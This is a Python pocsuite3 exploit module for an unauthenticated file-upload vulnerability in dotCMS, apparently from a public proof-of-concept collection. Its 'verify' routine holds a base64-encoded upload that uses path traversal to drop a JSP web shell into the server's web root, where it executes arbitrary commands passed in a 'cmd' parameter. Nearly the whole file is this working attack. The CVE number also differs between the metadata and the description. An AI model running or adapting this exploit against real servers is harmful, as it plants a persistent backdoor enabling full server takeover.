from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict
import re,base64
class DemoPOC(POCBase):
    vulID = 'CVE-2022-26532'  # ssvid
    version = '1.0'
    name = 'dotCMS 未授权文件上传'
    appName = 'dotCMS'
    appVersion = '<22.03'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''dotCMS 是一个Java开发的开源且跨平台的功能强大的内容管理系统(CMS)。CVE-2022-26352 中由于 api/content 路径存在未授权文件上传漏洞，攻击者可构造恶意请求上传webshell，从而执行任意代码，控制服务器。'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _verify(self):#验证模式
        result = {}
        try:
            headers = {
                    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15',
                    'Content-Length': '1152',
                    'Content-Type': 'multipart/form-data; boundary=------------------------aadc326f7ae3eac3',
                    'Accept-Encoding': 'gzip, deflate',
                    'Connection': 'close',
            }
            data = "LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS1hYWRjMzI2ZjdhZTNlYWMzCkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0ibmFtZSI7IGZpbGVuYW1lPSIuLi8uLi8uLi8uLi8uLi8uLi8uLi8uLi8uLi9zcnYvZG90c2VydmVyL3RvbWNhdC05LjAuNDEvd2ViYXBwcy9ST09UL3dlYnNoZWxsLmpzcCIKQ29udGVudC1UeXBlOiB0ZXh0L3BsYWluCgo8JUAgcGFnZSBpbXBvcnQ9ImphdmEudXRpbC4qLGphdmEuaW8uKiIlPgo8JQolPgo8SFRNTD48Qk9EWT4KQ29tbWFuZHMgd2l0aCBKU1AKPEZPUk0gTUVUSE9EPSJHRVQiIE5BTUU9Im15Zm9ybSIgQUNUSU9OPSIiPgo8SU5QVVQgVFlQRT0idGV4dCIgTkFNRT0iY21kIj4KPElOUFVUIFRZUEU9InN1Ym1pdCIgVkFMVUU9IlNlbmQiPgo8L0ZPUk0+CjxwcmU+CjwlCmlmIChyZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIikgIT0gbnVsbCkgewogICAgb3V0LnByaW50bG4oIkNvbW1hbmQ6ICIgKyByZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIikgKyAiPEJSPiIpOwogICAgUHJvY2VzcyBwOwogICAgaWYgKCBTeXN0ZW0uZ2V0UHJvcGVydHkoIm9zLm5hbWUiKS50b0xvd2VyQ2FzZSgpLmluZGV4T2YoIndpbmRvd3MiKSAhPSAtMSl7CiAgICAgICAgcCA9IFJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMoImNtZC5leGUgL0MgIiArIHJlcXVlc3QuZ2V0UGFyYW1ldGVyKCJjbWQiKSk7CiAgICB9CiAgICBlbHNlewogICAgICAgIHAgPSBSdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKHJlcXVlc3QuZ2V0UGFyYW1ldGVyKCJjbWQiKSk7CiAgICB9CiAgICBPdXRwdXRTdHJlYW0gb3MgPSBwLmdldE91dHB1dFN0cmVhbSgpOwogICAgSW5wdXRTdHJlYW0gaW4gPSBwLmdldElucHV0U3RyZWFtKCk7CiAgICBEYXRhSW5wdXRTdHJlYW0gZGlzID0gbmV3IERhdGFJbnB1dFN0cmVhbShpbik7CiAgICBTdHJpbmcgZGlzciA9IGRpcy5yZWFkTGluZSgpOwogICAgd2hpbGUgKCBkaXNyICE9IG51bGwgKSB7CiAgICBvdXQucHJpbnRsbihkaXNyKTsKICAgIGRpc3IgPSBkaXMucmVhZExpbmUoKTsKICAgIH0KfQolPgo8L3ByZT4KPC9CT0RZPjwvSFRNTD4KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS1hYWRjMzI2ZjdhZTNlYWMzLS0="
            target = self.url+"/api/content/"
            r = requests.post(url=target,timeout=8,verify=False,headers=headers,data=base64.b64decode(data.encode('ascii')).decode('ascii'))
            if r.status_code == 500:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = target
                result['VerifyInfo']['WebShell'] = self.url+"/webshell.jsp?cmd=whoami"
                return self.parse_output(result)
        except:
            return

    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(DemoPOC)